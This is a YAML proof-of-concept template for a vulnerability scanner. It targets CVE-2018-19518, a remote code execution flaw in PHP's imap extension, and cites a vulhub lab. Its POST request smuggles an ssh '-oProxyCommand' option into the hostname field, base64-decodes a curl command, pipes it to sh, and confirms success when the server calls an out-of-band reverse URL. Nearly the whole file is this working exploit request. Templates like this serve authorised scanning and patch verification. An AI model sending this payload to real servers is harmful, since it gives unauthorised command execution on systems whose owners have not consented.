name: poc-yaml-php-imap-cve-2018-19518-rce
manual: true
transport: http
set:
    s1: randomInt(1000, 2000)
    s2: randomInt(1000, 2000)
    reverse: newReverse()
    reverseURL: reverse.url
payloads:
    payloads:
        curl:
            cmd: base64("curl" + string(reverseURL))
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: hostname=x+-oProxyCommand%3decho%09{{cmd}}|base64%09-d|sh}&username={{s1}}&password={{s2}}
        expression: response.status == 200 && reverse.wait(10)
expression: r0()
detail:
    author: Monday
    links:
        - https://github.com/vulhub/vulhub/blob/9cdd452ce2ccc0495a8aa4d5ecfa952417712344/php/CVE-2018-19518/README.md
    vulnerability:
        id: CT-40186
        level: high
